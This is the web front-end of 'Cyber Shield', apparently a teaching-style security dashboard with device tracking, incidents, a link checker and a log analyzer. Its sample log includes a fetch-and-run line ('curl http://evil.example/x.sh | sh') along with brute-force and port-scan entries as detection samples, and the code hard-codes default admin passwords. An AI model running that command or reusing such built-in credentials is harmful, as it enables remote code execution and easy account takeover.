// Cyber Shield - the web version. The rules live in core.js; this file is the pages.
(() => {
'use strict';

const $ = (s, el = document) => el.querySelector(s);
const esc = s => String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
const REPO = 'https://github.com/vidulaj382-sys/cyber-shield/blob/main/';
const SEV_COLOR = { Low: 'var(--low)', Medium: 'var(--medium)', High: 'var(--high)', Critical: 'var(--critical)' };

// ---------------------------------------------------------------- state
const S = {
  user: null, page: 'home',
  users: [{ name: 'admin', role: 'Admin', hash: Core.hashPassword('admin123') },
          { name: 'employee', role: 'Employee', hash: Core.hashPassword('emp123') }],
  failed: {}, locked: new Set(),
  assets: [], incidents: [], audit: [], queue: [], undo: [], redo: [], fixStack: [],
  nextAsset: 1, nextInc: 1, threats: 0, selAsset: null, selInc: null,
  vault: null, showSecret: false, attackOut: [], linkResult: null, logReport: null, logText: '',
};
const SAMPLE_LOG = `Nov 18 09:01:12 web-01 sshd[1021]: Accepted password for admin from 10.0.0.5 port 51234 ssh2
Nov 18 09:03:44 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40022 ssh2
Nov 18 09:03:46 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40023 ssh2
Nov 18 09:03:48 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40024 ssh2
Nov 18 09:03:50 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40025 ssh2
Nov 18 09:03:52 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40026 ssh2
Nov 18 09:03:54 web-01 sshd[1030]: Failed password for root from 185.220.101.1 port 40027 ssh2
Nov 18 09:05:10 web-01 sshd[1044]: Invalid user oracle from 198.51.100.7
Nov 18 09:06:31 web-01 sshd[1052]: pam_unix(sshd:auth): authentication failure; user=admin rhost=192.0.2.50
Nov 18 09:08:00 web-01 CRON[1100]: (root) CMD (/usr/local/bin/backup.sh)
Nov 18 09:10:01 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=21
Nov 18 09:10:01 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=22
Nov 18 09:10:02 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=23
Nov 18 09:10:02 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=25
Nov 18 09:10:03 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=80
Nov 18 09:10:03 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=443
Nov 18 09:10:04 fw-01 kernel: IN=eth0 SRC=203.0.113.9 DST=10.0.0.10 PROTO=TCP DPT=3389
Nov 18 09:12:20 fw-01 kernel: IN=eth0 SRC=10.0.0.5 DST=10.0.0.10 PROTO=TCP DPT=443
Nov 18 09:14:02 web-01 nginx: 10.0.0.5 "GET /index.html HTTP/1.1" 200 5120
Nov 18 09:15:00 ids-01 snort: nmap scan detected from 203.0.113.9
Nov 18 09:25:10 web-01 bash[1200]: chmod 777 /var/www
Nov 18 09:26:03 web-01 bash[1200]: curl http://evil.example/x.sh | sh
Nov 18 09:30:11 web-01 nginx: 10.0.0.7 "GET /about.html HTTP/1.1" 200 2048
Nov 18 09:31:45 web-01 sshd[1260]: login failed for user bob from 192.0.2.50`;

const pad = n => String(n).padStart(2, '0');
const stamp = (d = new Date()) => `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
const log = (level, msg) => S.audit.push({ time: stamp(), level, msg });
const isAdmin = () => S.user && S.user.role === 'Admin';

// Employee privacy: other people's employee names are shown as e******e.
function maskText(text) {
  let out = String(text);
  for (const u of S.users)
    if (u.role === 'Employee' && (!S.user || u.name !== S.user.name))
      out = out.replace(new RegExp('(?<![A-Za-z0-9_])' + u.name + '(?![A-Za-z0-9_])', 'g'), Core.maskName(u.name));
  return out;
}
const shown = name => maskText(name);

function notify(msg, bad = true) {
  const t = $('#toast');
  t.innerHTML = `<div class="toast" style="background:${bad ? '#b91c1c' : '#1d4ed8'}" onclick="this.remove()"><b>${bad ? 'Oops' : 'Done'}</b>${esc(msg)}</div>`;
  clearTimeout(notify.t);
  notify.t = setTimeout(() => { t.innerHTML = ''; }, 5000);
}
const act = fn => { try { fn(); } catch (e) { notify(e.message); } };

// ---------------------------------------------------------------- data
function addIncident(title, device, severity, reporter) {
  const inc = { id: S.nextInc++, title, device, severity, open: true, reporter, events: [] };
  inc.events.push({ t: stamp(), who: reporter, what: 'Reported the problem' });
  S.incidents.push(inc);
  log('INFO', `Incident created: INC-${inc.id} [${severity}] ${title} on ${device} (by ${reporter})`);
  return inc;
}
function newAsset(spec) {
  const name = (spec.name || '').trim(), ip = (spec.ip || '').trim();
  if (!name) throw new Error('Invalid input: asset name is empty');
  if (!ip) throw new Error('Invalid input: IP address is empty');
  if (!(spec.crit >= 1 && spec.crit <= 5)) throw new Error('Invalid input: criticality must be between 1 and 5');
  return { id: S.nextAsset++, type: spec.type, name, ip, crit: spec.crit, extra: spec.extra || '',
           passed: new Set(spec.passed || []), alerts: 0 };
}
function checkDuplicate(name, ip, exceptId) {
  const other = S.assets.find(a => a.id !== exceptId && (a.name === name || a.ip === ip));
  if (other) throw new Error(`Invalid input: another device already uses that ${other.name === name ? 'name' : 'IP address'}`);
}
function seed() {
  for (const a of [['Server', 'web-01', '10.0.0.10', 5, 'http, https'], ['Server', 'db-01', '10.0.0.20', 5, 'postgres'],
                   ['Router', 'edge-rtr', '10.0.0.1', 4, 'ISP uplink'], ['Workstation', 'hr-laptop', '10.0.1.15', 2, 'HR team']])
    S.assets.push(newAsset({ type: a[0], name: a[1], ip: a[2], crit: a[3], extra: a[4] }));
  addIncident('Suspicious login at night', 'web-01', 'Medium', 'system');
  addIncident('USB drive found in server room', 'db-01', 'Low', 'system');
  addIncident('Router firmware out of date', 'edge-rtr', 'High', 'system');
  log('INFO', 'Cyber Shield started');
}
function loadSample() {
  const assets = [['Server', 'mail-01', '10.0.0.30', 4, 'smtp, imap'], ['Server', 'backup-01', '10.0.0.40', 4, 'nightly backups'],
    ['Router', 'fw-01', '10.0.0.2', 5, 'firewall'], ['Workstation', 'ceo-laptop', '10.0.1.5', 5, 'CEO'],
    ['Workstation', 'reception-pc', '10.0.1.20', 2, 'front desk'], ['Workstation', 'lab-pc-07', '10.0.2.17', 1, 'school lab']];
  const incs = [['Fake bank email reached the staff', 'mail-01', 'High', false], ['Ransomware note found on a laptop', 'ceo-laptop', 'Critical', false],
    ['Many wrong passwords on the login page', 'web-01', 'High', true], ['Website slow because of too many visitors', 'web-01', 'Critical', true],
    ['Backup job failed last night', 'backup-01', 'Medium', false], ['Firewall software is out of date', 'fw-01', 'Medium', false],
    ['USB stick plugged in without asking', 'reception-pc', 'Low', true], ['Weak password found on a lab computer', 'lab-pc-07', 'Low', false]];
  let na = 0, ni = 0;
  for (const a of assets)
    if (!S.assets.some(x => x.name === a[1] || x.ip === a[2])) { S.assets.push(newAsset({ type: a[0], name: a[1], ip: a[2], crit: a[3], extra: a[4] })); na++; }
  for (const i of incs)
    if (!S.incidents.some(x => x.title === i[0] && x.device === i[1])) {
      const inc = addIncident(i[0], i[1], i[2], 'sample');
      if (!i[3]) { /* stays open */ } else { inc.open = false; inc.events.push({ t: stamp(), who: 'system', what: 'Marked as fixed' }); }
      ni++;
    }
  log('INFO', `${S.user.name} loaded sample data: ${na} devices, ${ni} problems`);
  return `Added ${na} devices and ${ni} problems.`;
}

// Undo / redo of device changes: every change is a small command object (core/AssetCommand.h).
const cmdAdd = a => ({ text: 'adding ' + a.name, run() { if (!S.assets.includes(a)) S.assets.push(a); }, undo() { S.assets = S.assets.filter(x => x !== a); } });
const cmdRemove = a => ({ text: 'removing ' + a.name, run() { S.assets = S.assets.filter(x => x !== a); },
  undo() { S.assets.push(a); S.assets.sort((x, y) => x.id - y.id); } });
const cmdEdit = (a, before, after) => ({ text: 'changing ' + before.name,
  run() { Object.assign(a, after); }, undo() { Object.assign(a, before); } });
function doCmd(cmd) { cmd.run(); S.undo.push(cmd); S.redo.length = 0; }

// A detection: incident + alert on the device + critical warning (SecurityManager::recordThreat).
function recordThreat(name, source) {
  const t = Core.THREATS[name];
  S.threats++;
  addIncident(name + ' detected', source, t.severity, 'scanner');
  const dev = S.assets.find(a => a.name === source);
  if (dev && dev.type !== 'Workstation') dev.alerts++;
  log('WARN', `${name} detected from ${source}`);
  if (t.severity === 'Critical') criticalAlert(`CRITICAL: ${name} detected from ${source}`);
  return [`[DETECTED] ${name} (${t.severity}) from ${source} -> ${t.advice}`, `    What is this? ${t.explain}`];
}
function criticalAlert(msg) {
  const bar = $('#alertbar');
  if (bar) { bar.textContent = '!  ' + msg; bar.classList.add('show'); clearTimeout(criticalAlert.t); criticalAlert.t = setTimeout(() => bar.classList.remove('show'), 5500); }
  $('#toast').innerHTML = `<div class="toast" onclick="this.remove()"><b>Critical threat!</b>${esc(msg)}</div>`;
  clearTimeout(notify.t); notify.t = setTimeout(() => { $('#toast').innerHTML = ''; }, 6000);
  try { // a short warning beep
    const ctx = new (window.AudioContext || window.webkitAudioContext)(), o = ctx.createOscillator(), g = ctx.createGain();
    o.type = 'square'; o.frequency.value = 660; g.gain.value = 0.04; o.connect(g); g.connect(ctx.destination);
    o.start(); o.stop(ctx.currentTime + 0.25);
  } catch (e) { /* sound is optional */ }
}

// ---------------------------------------------------------------- tables (click a column to sort, type to search)
const T = {};
function numberOf(cell) {
  let t = String(cell); if (t[0] === '#') t = t.slice(1); else if (t.startsWith('INC-')) t = t.slice(4);
  return /^\d/.test(t) ? parseFloat(t) : NaN;
}
function makeTable(id, cols, rows, onSelect) {
  const old = T[id] || {};
  T[id] = { cols, rows, sort: old.sort ?? -1, asc: old.asc ?? true, filter: old.filter || '', sel: old.sel ?? null, onSelect };
}
function drawTable(id) {
  const t = T[id], box = $('#tb-' + id); if (!t || !box) return;
  let rows = t.rows.filter(r => !t.filter || r.cells.join(' ').toLowerCase().includes(t.filter.toLowerCase()));
  if (t.sort >= 0) rows = rows.slice().sort((a, b) => {
    const x = a.cells[t.sort], y = b.cells[t.sort], nx = numberOf(x), ny = numberOf(y);
    const c = !isNaN(nx) && !isNaN(ny) ? nx - ny : String(x).toLowerCase() < String(y).toLowerCase() ? -1 : String(x).toLowerCase() > String(y).toLowerCase() ? 1 : 0;
    return t.asc ? c : -c;
  });
  box.innerHTML = `<table><thead><tr>${t.cols.map((c, i) => `<th data-i="${i}">${esc(c)}${i === t.sort ? (t.asc ? ' &#9650;' : ' &#9660;') : ''}</th>`).join('')}</tr></thead>` +
    `<tbody>${rows.map(r => `<tr class="row ${t.sel === r.id ? 'sel' : ''} ${r.color ? '' : 'plain'}" data-id="${r.id}" style="${r.color ? '--c:' + r.color : ''}">${r.cells.map(c => `<td>${esc(c)}</td>`).join('')}</tr>`).join('')}</tbody></table>` +
    (rows.length ? '' : '<div class="empty">Nothing to show.</div>');
  box.querySelectorAll('th').forEach(th => th.onclick = () => {
    const i = +th.dataset.i; if (t.sort === i) t.asc = !t.asc; else { t.sort = i; t.asc = true; } drawTable(id);
  });
  box.querySelectorAll('tr.row').forEach(tr => tr.onclick = () => { t.sel = +tr.dataset.id; drawTable(id); if (t.onSelect) t.onSelect(t.sel); });
}
const tableBox = id => `<div class="tablewrap" id="tb-${id}"></div>`;
function bindFilter(id, input) { input.oninput = () => { T[id].filter = input.value; drawTable(id); }; }

// ---------------------------------------------------------------- pages
const PAGES = [
  { id: 'home', title: 'Home', sub: 'Is everything safe today? Start here.' },
  { id: 'devices', title: 'My Devices', sub: 'The computers, servers and routers we look after.' },
  { id: 'network', title: 'Network Map', sub: 'See all your devices at once. The redder a node, the riskier it is.' },
  { id: 'attack', title: 'Attack Detector', sub: 'Paste something suspicious and we will tell you if it is an attack.' },
  { id: 'link', title: 'Link Checker', sub: 'Paste a link BEFORE you click it. We will tell you if it is safe.' },
  { id: 'logs', title: 'Log Analyzer', sub: 'Open a log file and we will mark the suspicious lines for you.' },
  { id: 'vault', title: 'Safe Box', sub: 'A locked box for your secret notes and passwords.' },
  { id: 'problems', title: 'Problems', sub: 'Write down security problems and mark them as fixed.' },
  { id: 'report', title: 'My Report', sub: 'A summary of everything, ready to save as a file.' },
  { id: 'history', title: 'History', sub: 'A diary of who did what and when. Filter it by level or by person.' },
  { id: 'people', title: 'People', sub: 'Who is allowed to use this app (only an Admin can change this).' },
];
const sevColor = s => SEV_COLOR[s];
const riskColor = level => SEV_COLOR[level];

// ----- Home
function pageHome() {
  const open = S.incidents.filter(i => i.open), risk = Core.overallRisk(S.incidents);
  const counts = Core.SEVERITIES.map(s => open.filter(i => i.severity === s).length), max = Math.max(4, ...counts);
  let c, title, msg;
  if (!open.length) { c = 'var(--low)'; title = 'All clear! Everything looks safe.'; msg = 'There are no problems to fix right now. Great job!'; }
  else if (risk.percent < 50) { c = 'var(--medium)'; title = `Be careful: ${open.length} problem${open.length === 1 ? ' needs' : 's need'} fixing.`; msg = 'Open the Problems page and mark each one as fixed when you have dealt with it.'; }
  else { c = 'var(--critical)'; title = `Danger! ${open.length} problem${open.length === 1 ? ' needs' : 's need'} your attention.`; msg = 'Some of them are serious. Open the Problems page and start with the red ones.'; }
  const theta = Math.PI * risk.percent / 100, ex = 100 - 80 * Math.cos(theta), ey = 100 - 80 * Math.sin(theta);
  const rc = riskColor(risk.level), fixed = S.incidents.length - open.length;
  const card = (cap, v, n, col) => `<div class="card stat" style="--c:${col}"><small>${cap}</small><div class="v">${v}</div><div class="n">${n}</div></div>`;
  return { html: `
    <div class="banner row" style="--c:${c}"><div><b>${esc(title)}</b><span>${esc(msg)}</span></div>
      <button class="btn" id="sample" ${isAdmin() ? '' : 'disabled'} title="Adds example devices and problems (Admin only)">Load sample data</button></div>
    <div class="grid4">
      ${card('DEVICES WE PROTECT', S.assets.length, 'computers, servers, routers', 'var(--accent)')}
      ${card('PROBLEMS TO FIX', open.length, open.length ? 'waiting for you' : 'nothing to do', open.length ? 'var(--critical)' : 'var(--low)')}
      ${card('ATTACKS CAUGHT', S.threats, 'since you opened the app', 'var(--high)')}
      ${card('PROBLEMS FIXED', fixed, `out of ${S.incidents.length} in total`, 'var(--low)')}
    </div>
    <div class="grid2">
      <div class="card"><h3>Open problems, by how serious they are</h3>
        <div class="bars">${counts.map((n, i) => `<div class="bar"><b>${n}</b><i style="height:${n / max * 100}%;--c:${sevColor(Core.SEVERITIES[i])}"></i></div>`).join('')}</div>
        <div class="barlabels">${Core.SEVERITIES.map(s => `<span>${s}</span>`).join('')}</div></div>
      <div>
        <div class="card gauge"><h3>Danger level</h3>
          <svg viewBox="0 0 200 118"><path d="M20 100A80 80 0 0 1 180 100" fill="none" stroke="var(--grid)" stroke-width="18"/>
            ${risk.percent ? `<path d="M20 100A80 80 0 0 1 ${ex.toFixed(1)} ${ey.toFixed(1)}" fill="none" stroke="${rc}" stroke-width="18"/>` : ''}
            <text x="100" y="92" text-anchor="middle" class="pct" fill="currentColor" font-size="30" font-weight="700">${risk.percent}%</text></svg>
          <div class="lvl" style="color:${rc}">${risk.level} risk</div></div>
        <div class="card" style="margin-top:14px"><h3>Newest problems</h3>
          ${S.incidents.slice(-5).reverse().map(i => `<div style="color:${i.open ? sevColor(i.severity) : 'var(--resolved)'};margin:4px 0"><b>INC-${i.id}</b> &nbsp;${i.severity} &nbsp;<span style="color:var(--text)">${esc(i.title)}</span></div>`).join('') || '<div class="note">No problems yet.</div>'}
        </div></div>
    </div>`,
    bind() { $('#sample').onclick = () => act(() => { notify(loadSample() + ' Look at My Devices and Problems.', false); show('home'); }); } };
}

// ----- My Devices
function assetRows(filter) {
  const f = (filter || '').toLowerCase();
  return S.assets.map(a => ({ a, risk: Core.riskOf(a, S.incidents) }))
    .filter(x => !f || x.a.name.toLowerCase().includes(f))
    .sort((x, y) => y.risk.percent - x.risk.percent)
    .map(({ a, risk }) => ({ id: a.id, color: riskColor(risk.level),
      cells: ['#' + a.id, a.type, a.name, a.ip, `${risk.percent} ${risk.level}`, Core.compliance(a) + '%', a.type === 'Workstation' ? '-' : String(a.alerts)] }));
}
function pageDevices() {
  const adm = isAdmin(), dis = adm ? '' : 'disabled';
  return { html: `
    <div class="split"><div>
      <div class="tools-row"><input type="search" id="q-dev" placeholder="Search devices..." style="max-width:260px"><span class="note">Click a column name to sort. Row colour = risk.</span></div>
      ${tableBox('dev')}</div>
      <div>
        <div class="card"><h3>Add or change a device (Admin only)</h3>
          <label class="f">Name</label><input id="d-name" ${dis}>
          <label class="f">Number (IP)</label><input id="d-ip" ${dis}>
          <div class="row2"><div><label class="f">Important? 1-5</label><input id="d-crit" type="number" min="1" max="5" value="3" ${dis}></div>
            <div><label class="f">Kind</label><select id="d-type" ${dis}><option>Workstation</option><option>Server</option><option>Router</option></select></div></div>
          <label class="f">Extra info (owner / services / uplink)</label><input id="d-extra" ${dis}>
          <div class="row2" style="margin-top:12px"><button class="btn blue" id="d-add" ${dis}>Add device</button><button class="btn green" id="d-save" ${dis}>Save changes</button></div>
          <div class="row2" style="margin-top:10px;grid-template-columns:1fr 1fr 1fr"><button class="btn red" id="d-del" ${dis}>Remove</button>
            <button class="btn amber" id="d-undo" ${adm && S.undo.length ? '' : 'disabled'}>Undo</button><button class="btn amber" id="d-redo" ${adm && S.redo.length ? '' : 'disabled'}>Redo</button></div>
          ${adm ? '' : '<p class="hint">You can look at the devices, but only an Admin can change them.</p>'}
        </div>
        <div class="card" style="margin-top:14px"><h3>Security checklist of the selected device</h3><div class="checks" id="checks"></div><div id="comp" class="meter"></div></div>
      </div></div>`,
    bind() {
      const redraw = () => { makeTable('dev', ['Id', 'Kind', 'Name', 'IP number', 'Risk', 'Secure', 'Alerts'], assetRows($('#q-dev').value), pick); drawTable('dev'); };
      const pick = id => {
        S.selAsset = id; const a = S.assets.find(x => x.id === id); if (!a) return;
        $('#d-name').value = a.name; $('#d-ip').value = a.ip; $('#d-crit').value = a.crit; $('#d-type').value = a.type; $('#d-extra').value = a.extra;
        showChecks();
      };
      const showChecks = () => {
        const a = S.assets.find(x => x.id === S.selAsset);
        $('#checks').innerHTML = a ? Core.CHECKLIST.map((c, i) => `<label><input type="checkbox" data-i="${i}" ${a.passed.has(c) ? 'checked' : ''} ${adm ? '' : 'disabled'}> ${esc(c)}</label>`).join('') : '<p class="hint">Click a device to see its checklist.</p>';
        const p = a ? Core.compliance(a) : 0;
        $('#comp').innerHTML = a ? `Compliance: <span style="color:${p >= 80 ? 'var(--low)' : p >= 50 ? 'var(--medium)' : 'var(--critical)'}">${p}% of the checks are done</span>` : '';
        $('#checks').querySelectorAll('input').forEach(cb => cb.onchange = () => act(() => {
          const c = Core.CHECKLIST[+cb.dataset.i]; cb.checked ? a.passed.add(c) : a.passed.delete(c);
          log('INFO', `${a.name}: '${c}' marked ${cb.checked ? 'done' : 'not done'}`); redraw(); showChecks();
        }));
      };
      const spec = () => ({ type: $('#d-type').value, name: $('#d-name').value.trim(), ip: $('#d-ip').value.trim(), crit: parseInt($('#d-crit').value, 10), extra: $('#d-extra').value.trim() });
      const refreshBtns = () => { $('#d-undo').disabled = !(adm && S.undo.length); $('#d-redo').disabled = !(adm && S.redo.length); };
      $('#d-add').onclick = () => act(() => {
        const s = spec(); checkDuplicate(s.name, s.ip, 0); const a = newAsset(s); doCmd(cmdAdd(a)); log('INFO', 'Asset added: ' + a.name);
        ['#d-name', '#d-ip', '#d-extra'].forEach(i => $(i).value = ''); S.selAsset = null; T.dev.sel = null; redraw(); showChecks(); refreshBtns();
      });
      $('#d-save').onclick = () => act(() => {
        const a = S.assets.find(x => x.id === S.selAsset); if (!a) throw new Error('Invalid input: select a row in the list first');
        const s = spec(); if (!s.name || !s.ip) throw new Error('Invalid input: name and IP address are required');
        if (!(s.crit >= 1 && s.crit <= 5)) throw new Error('Invalid input: criticality must be between 1 and 5');
        checkDuplicate(s.name, s.ip, a.id);
        doCmd(cmdEdit(a, { name: a.name, ip: a.ip, crit: a.crit, extra: a.extra }, { name: s.name, ip: s.ip, crit: s.crit, extra: s.extra }));
        log('INFO', 'Asset changed: ' + a.name); redraw(); refreshBtns();
      });
      $('#d-del').onclick = () => act(() => {
        const a = S.assets.find(x => x.id === S.selAsset); if (!a) throw new Error('Invalid input: select a row in the list first');
        if (!confirm(`Remove device #${a.id}? (You can press Undo afterwards.)`)) return;
        doCmd(cmdRemove(a)); log('INFO', 'Asset removed: #' + a.id); S.selAsset = null; T.dev.sel = null; redraw(); showChecks(); refreshBtns();
      });
      $('#d-undo').onclick = () => act(() => { const c = S.undo.pop(); c.undo(); S.redo.push(c); log('INFO', `${S.user.name} Undone: ${c.text}`); redraw(); showChecks(); refreshBtns(); });
      $('#d-redo').onclick = () => act(() => { const c = S.redo.pop(); c.run(); S.undo.push(c); log('INFO', `${S.user.name} Done again: ${c.text}`); redraw(); showChecks(); refreshBtns(); });
      $('#q-dev').oninput = redraw;
      redraw(); showChecks();
    } };
}

// ----- Network Map
function pageNetwork() {
  return { html: `<div class="map"><svg id="svg" viewBox="0 0 900 480"></svg></div><div class="card" id="netinfo" style="margin-top:12px">Click a device to see the details.</div>`,
    bind() {
      const rows = S.assets.map(a => ({ a, risk: Core.riskOf(a, S.incidents) })).sort((x, y) => y.risk.percent - x.risk.percent);
      const cx = 450, cy = 250, rx = 330, ry = 160, n = rows.length || 1;
      let s = `<text x="24" y="30" style="text-anchor:start;fill:var(--accent);font-weight:700">Network map - colour = risk</text>`;
      Core.SEVERITIES.forEach((l, i) => { s += `<circle cx="${560 + i * 85}" cy="26" r="6" fill="${sevColor(l)}"/><text x="${572 + i * 85}" y="31" style="text-anchor:start;fill:var(--muted);font-size:12px">${l}</text>`; });
      const pos = rows.map((r, i) => { const ang = -Math.PI / 2 + 2 * Math.PI * i / n; return [cx + rx * Math.cos(ang), cy + ry * Math.sin(ang)]; });
      pos.forEach(p => { s += `<line x1="${cx}" y1="${cy}" x2="${p[0]}" y2="${p[1]}" stroke="var(--grid)" stroke-width="2"/>`; });
      s += `<circle cx="${cx}" cy="${cy}" r="36" fill="var(--accent)"/><text x="${cx}" y="${cy + 5}" style="fill:#fff;font-weight:700">Network</text>`;
      rows.forEach((r, i) => {
        const [x, y] = pos[i];
        s += `<g class="node" data-i="${i}"><circle cx="${x}" cy="${y}" r="28" fill="${riskColor(r.risk.level)}"/><text x="${x}" y="${y + 5}" style="fill:#fff;font-weight:700;font-size:15px">${r.risk.percent}</text>` +
          `<text x="${x}" y="${y + 46}" style="font-weight:700;font-size:12px">${esc(r.a.name)}</text><text x="${x}" y="${y + 60}" style="fill:var(--muted);font-size:11px">${r.a.type}</text></g>`;
      });
      $('#svg').innerHTML = s;
      $('#svg').querySelectorAll('.node').forEach(g => g.onclick = () => {
        const { a, risk } = rows[+g.dataset.i];
        $('#netinfo').innerHTML = `<b>${esc(a.name)}</b> (${a.type}) &nbsp; IP ${esc(a.ip)} &nbsp; Risk <b style="color:${riskColor(risk.level)}">${risk.percent}% ${risk.level}</b> &nbsp; Checklist ${Core.compliance(a)}% done` + (a.type === 'Workstation' ? '' : ` &nbsp; Alerts ${a.alerts}`);
      });
    } };
}

// ----- Attack Detector
const consoleHTML = lines => lines.map(l => `<div class="${l.startsWith('[DETECTED]') ? 'd' : l.startsWith('[CLEAN]') ? 'c' : l.startsWith('[QUEUED]') ? 'q' : ''}">${esc(l)}</div>`).join('');
function pageAttack() {
  const adm = isAdmin();
  return { html: `
    <div class="split"><div class="card">
      <label class="f">Where from?</label><input id="a-src" value="web-01">
      <label class="f">Paste it here (a message, a file name, an IP number)</label>
      <textarea id="a-text">URGENT: verify your account now, click here http://bank-login.example</textarea>
      <div style="display:flex;gap:10px;margin-top:12px;flex-wrap:wrap">
        <button class="btn blue" id="a-now" ${adm ? '' : 'disabled'}>Check it now</button>
        <button class="btn" id="a-later">Check it later</button>
        <button class="btn green" id="a-run" ${adm && S.queue.length ? '' : 'disabled'}>Check all waiting (${S.queue.length})</button></div>
      <div class="row2" style="margin-top:14px"><div><label class="f">Wrong tries</label><input id="a-fail" type="number" min="0" value="7"></div>
        <div><label class="f">Visitors per second</label><input id="a-rps" type="number" min="0" value="2500"></div></div>
      <div style="margin-top:12px"><button class="btn amber" id="a-num" ${adm ? '' : 'disabled'}>Check the numbers</button>
        <button class="btn" id="a-clear">Clear</button></div>
      ${adm ? '' : '<p class="hint">Only an Admin can run checks. You can still add samples to the waiting line.</p>'}</div>
      <div><h3 style="margin-bottom:8px;color:var(--accent)">What we found</h3><div class="console" id="a-out"></div>
        <p class="hint">Try: trojan.exe.zip &nbsp;|&nbsp; 185.220.101.1 &nbsp;|&nbsp; SYN flood &nbsp;|&nbsp; verify your account, click here</p></div></div>`,
    bind() {
      const out = () => { $('#a-out').innerHTML = consoleHTML(S.attackOut.length ? S.attackOut : ['Ready! Paste something suspicious and press Check it now.']); $('#a-out').scrollTop = 1e9; };
      const src = () => $('#a-src').value.trim() || 'unknown';
      const scanOne = (source, text) => { const f = Core.scanText(text); return f.length ? f.flatMap(n => recordThreat(n, source)) : [`[CLEAN] No threats found in sample from ${source}`]; };
      $('#a-now').onclick = () => act(() => { S.attackOut.push(...scanOne(src(), $('#a-text').value)); out(); });
      $('#a-later').onclick = () => act(() => { if (!$('#a-text').value) throw new Error('Invalid input: both source and sample are required');
        S.queue.push([src(), $('#a-text').value]); S.attackOut.push('[QUEUED] sample from ' + src()); show('attack'); });
      $('#a-run').onclick = () => act(() => { if (!S.queue.length) throw new Error('Invalid input: the scan queue is empty');
        while (S.queue.length) { const [s, t] = S.queue.shift(); S.attackOut.push(...scanOne(s, t)); } show('attack'); });
      $('#a-num').onclick = () => act(() => { const f = Core.scanNumbers(+$('#a-fail').value, +$('#a-rps').value);
        S.attackOut.push(...(f.length ? f.flatMap(n => recordThreat(n, src())) : [`[CLEAN] ${$('#a-fail').value} failed logins and ${$('#a-rps').value} requests/sec are below the limits`])); out(); });
      $('#a-clear').onclick = () => { S.attackOut = []; out(); };
      out();
    } };
}

// ----- Link Checker
function pageLink() {
  const EX = ['https://www.wikipedia.org/wiki/Cat', 'http://bit.ly/my-new-game', 'http://185.220.101.1/verify-your-bank-account/login'];
  return { html: `
    <div class="card"><label class="f" style="margin-top:0">Paste the link here</label>
      <div style="display:flex;gap:10px"><input id="l-url" placeholder="https://..." autocomplete="off"><button class="btn blue" id="l-go">Check it!</button></div>
      <div style="display:flex;gap:10px;margin-top:10px;flex-wrap:wrap;align-items:center"><span class="note">Or try:</span>
        <button class="btn" data-ex="0">Try a safe link</button><button class="btn" data-ex="1">Try a tricky link</button><button class="btn" data-ex="2">Try a dangerous link</button></div></div>
    <div id="l-out" style="margin-top:14px"></div>`,
    bind() {
      const draw = () => {
        const r = S.linkResult; if (!r) { $('#l-out').innerHTML = '<div class="banner" style="--c:var(--muted)"><b>Waiting for a link...</b><span>Paste a link above and press Check it!</span></div>'; return; }
        const m = { Safe: ['var(--low)', 'SAFE - this link looks fine', 'You can open it. Still, only click links from people you know.'],
          Suspicious: ['var(--medium)', 'BE CAREFUL - something looks odd', 'Do not type any password on it. Ask a grown-up before you open it.'],
          Dangerous: ['var(--critical)', 'DANGEROUS - do not click it!', 'Do not click it. Delete the message and tell a grown-up or the security team.'] }[r.verdict];
        $('#l-out').innerHTML = `<div class="banner" style="--c:${m[0]}"><b>${m[1]}</b><span>Website: ${esc(r.host)} &nbsp;|&nbsp; Danger points: ${r.score} (0-1 safe, 2-3 suspicious, 4+ dangerous)${r.verdict === 'Dangerous' ? '. A problem was added to the Problems page.' : ''}</span></div>
          <div class="card" style="margin-top:14px"><h3>Why did we say that?</h3>${r.reasons.map(x => `<div style="margin:5px 0">&bull; ${esc(x)}</div>`).join('')}</div>
          <div class="card" style="margin-top:14px"><b>What should I do?</b> ${m[2]}</div>`;
      };
      const check = url => act(() => {
        const r = Core.analyzeLink(url); S.linkResult = r; log('INFO', `Link checked: ${r.host} -> ${r.verdict}`);
        if (r.verdict === 'Dangerous') { S.threats++; addIncident('Dangerous link: ' + r.host, r.host, 'High', S.user.name); log('WARN', 'Dangerous link found: ' + r.host); }
        draw();
      });
      $('#l-go').onclick = () => check($('#l-url').value);
      $('#l-url').onkeydown = e => { if (e.key === 'Enter') check(e.target.value); };
      document.querySelectorAll('[data-ex]').forEach(b => b.onclick = () => { $('#l-url').value = EX[+b.dataset.ex]; check(EX[+b.dataset.ex]); });
      draw();
    } };
}

// ----- Log Analyzer
function pageLogs() {
  const adm = isAdmin();
  return { html: `
    <div class="card"><div style="display:flex;gap:10px;flex-wrap:wrap;align-items:center">
      <label class="btn" style="margin:0">Open a log file...<input type="file" id="g-file" accept=".log,.txt,text/plain" hidden ${adm ? '' : 'disabled'}></label>
      <button class="btn" id="g-sample" ${adm ? '' : 'disabled'}>Load the sample log</button>
      <label style="display:flex;gap:8px;align-items:center"><input type="checkbox" id="g-make" ${adm ? '' : 'disabled'}> Also add what we find to the Problems page</label>
      <button class="btn blue" id="g-go" ${adm ? '' : 'disabled'}>Analyze it!</button></div>
      <textarea id="g-text" style="margin-top:10px;min-height:150px;font-family:Consolas,monospace;font-size:12.5px" placeholder="Paste log lines here, or open a file..." ${adm ? '' : 'disabled'}></textarea>
      ${adm ? '' : '<p class="hint">Only an Admin can analyze log files.</p>'}</div>
    <div id="g-out" style="margin-top:14px"></div>`,
    bind() {
      $('#g-text').value = S.logText;
